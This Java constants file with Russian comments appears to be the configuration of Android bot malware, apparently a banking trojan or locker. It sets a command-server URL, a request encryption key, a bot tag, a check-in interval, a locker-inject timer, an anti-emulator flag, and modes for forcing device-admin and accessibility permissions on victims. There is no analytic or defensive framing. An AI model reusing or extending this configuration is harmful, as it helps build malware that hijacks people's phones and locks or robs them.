package myapp.stuff.example;

public class Constants{

  public final String urls = "http://192.168.1.9";//"<url>";
  public final String urlInj = "";
  public final String urlTwitter = "https://twitter.com/qweqweqwe";//"<urltwitter>";
  public final boolean antiEmulator = false;
  public final boolean Logger = false;//Логирование true - показывать, false - нет
  public final String key_post = "locker";//"<key>";//ключ шифрования запросов RequestHttp
  public final String Version = "coba";//"<tag>";//Метка бота
  public final String nameDex = Version;
  public final int intervalTime = 10000;//-=interval=-;//отстук милисекунд

  public final int intervalLockInjTime = 12000;//инжект локер милисекунд
  public boolean checkActivityImage=false;//Показывать ли после установки изображение или нет!
  public String urlImage = "<urlImage>";
  public int DeviceAdmin=0; //0 - без админ прав, 1 - с админ правами, 2 - с адин правами до 6.0
  public int StartRequest=1;
  /*
  1 - После установки требует спец. возмонсти далее подтверждает админ права и разрешения
  2 - Запрашиваем админ права (остальное можно по команде)
  3 - Запрашиваем админ права остальное через 17 минут
  4 - Запрашиваем админ права и разрешения (остальное можно по команде)
  5 - Запрашивать админ права и спец возможности (остальное можно по команде)
  6 - Запрашивать админ права и спец возможности  остальное через 17 минут
  */
}